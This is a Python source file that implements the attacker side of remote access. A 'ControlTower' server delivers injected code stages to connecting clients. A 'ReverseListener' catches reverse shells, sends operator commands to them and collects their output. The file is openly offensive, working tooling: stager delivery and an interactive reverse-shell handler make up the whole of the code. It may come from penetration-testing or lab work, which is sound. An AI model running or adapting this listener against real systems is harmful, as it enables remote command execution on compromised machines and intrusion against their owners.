#!/usr/bin/python3

import socket
import time
import threading
import re

from itertools import chain


class ControlTower:
    def __init__(self, ip, port, timeout=1, recv_cb=None, success_cb=None):

        self.recv_cb = recv_cb
        self.success_cb = success_cb

        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.bind((ip, port))
        self.server_socket.listen(5)

        self.listening_thread = None

        self.client_threads = []

        self.client_connections = []

        self.active = False

        self.timeout = timeout

    def inject_stage(self, code, client_idx=0):
        if len(self.client_connections) == 0:
            print('ControlTower: No clients have connected yet')
            return

        conn = self.client_connections[client_idx]

        conn.settimeout(self.timeout)

        with conn:
            while self.active:
                try:
                    _ = conn.recv(1024)  # todo?
                except socket.timeout:
                    pass

                to_send = code

                conn.send(to_send)  # .encode()

                break

    def handle_client(self, conn, addr):
        print(f"ControlTower: {addr} connected")
        if self.success_cb:
            self.success_cb(self)
            # self.success_cb(addr)

    def start_listening(self):
        while self.active:
            try:
                conn, addr = self.server_socket.accept()
                self.server_socket.settimeout(self.timeout)
                self.client_connections.append(conn)
                client_thread = threading.Thread(target=self.handle_client, args=(conn, addr))
                client_thread.daemon = True
                client_thread.start()
                self.client_threads.append(client_thread)
            except OSError: # timeout err
                continue

    def start(self):
        self.active = True
        print(f"ControlTower: Listening on {self.server_socket.getsockname()}")
        self.listening_thread = threading.Thread(target=self.start_listening)
        self.listening_thread.daemon = True
        self.listening_thread.start()

    def stop(self):
        self.active = False

        for conn in self.client_connections:
            conn.close()

        self.server_socket.close()

        self.listening_thread.join()

        for client_thread in self.client_threads:
            client_thread.join()

        print("ControlTower: Server stopped")


class ReverseListener:
    def __init__(self, ip, port, once=True, cmd_cb=None, recv_cb=None, success_cb=None):
        port = int(port)

        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.bind((ip, port))
        self.server_socket.listen(5)
        self.once = once
        self.cmd_cb = cmd_cb
        self.recv_cb = recv_cb
        self.success_cb = success_cb
        self.listening_thread = None
        self.client_threads = []
        self.active = False
        self.client_connections = []
        self.all_recv = []
        self.kill = False
        # need a mapping of client ips to inner indices

    def get_recv(self):
        return "".join(chain.from_iterable(self.all_recv))

    def handle_client(self, conn, addr):
        print(f"ReverseListener: {addr} connected")
        if self.success_cb:
            self.success_cb(addr)
        conn.settimeout(1) # socket-level timeout is ignored here for some reason

        self.all_recv.append([])
        client_index = len(self.all_recv) - 1 # race condition on multiple clients?

        with conn:
            while self.active:
                if self.cmd_cb:
                    cmd = self.cmd_cb()
                else:
                    cmd = input("Enter command: ")

                conn.send((cmd + '\n').encode())

                try:
                    data = conn.recv(1024)
                except socket.timeout:
                    continue

                if not data:
                    break

                ansi_escape = re.compile(r'\x1b\[.*?m|\x1b\]0;.*?\x07')

                raw_data = [data]

                while True:
                    if not data:
                        break
                    d_string = data.decode()
                    d_clean = ansi_escape.sub('', d_string) # prevent OSC from breaking the terminal
                    self.all_recv[client_index].append(d_clean)
                    try:
                        data = conn.recv(1024)
                        if data == raw_data[-1]:
                            break
                        else:
                            raw_data.append(data)
                    except OSError:
                        break

                if self.recv_cb:
                    self.recv_cb(raw_data)

                if self.once:
                    break

                time.sleep(0.250)

        print(f"ReverseListener: Connection with {addr} closed")
        self.client_connections.remove(conn)

    def start_listening(self):
        while self.active:
            try:
                conn, addr = self.server_socket.accept()
                self.server_socket.settimeout(1) # accept() and recv() are blocking, the loop can't check for active otherwise
                self.client_connections.append(conn)
                client_thread = threading.Thread(target=self.handle_client, args=(conn, addr))
                client_thread.daemon = True
                client_thread.start()
                self.client_threads.append(client_thread)
            except OSError: # timeout err
                continue

    def start(self):
        self.active = True
        print(f"ReverseListener: Listening on {self.server_socket.getsockname()}")
        self.listening_thread = threading.Thread(target=self.start_listening)
        self.listening_thread.daemon = True
        self.listening_thread.start()

    def stop(self):
        self.active = False

        for conn in self.client_connections:
            conn.close()

        self.server_socket.close()

        self.listening_thread.join()

        for client_thread in self.client_threads:
            client_thread.join()

        print("ReverseListener: Server stopped")


if __name__ == "__main__":
    try:
        listener = ReverseListener('127.0.0.1', 8999, once=True)
        listener.start()
        time.sleep(10)
    finally:
        listener.stop()

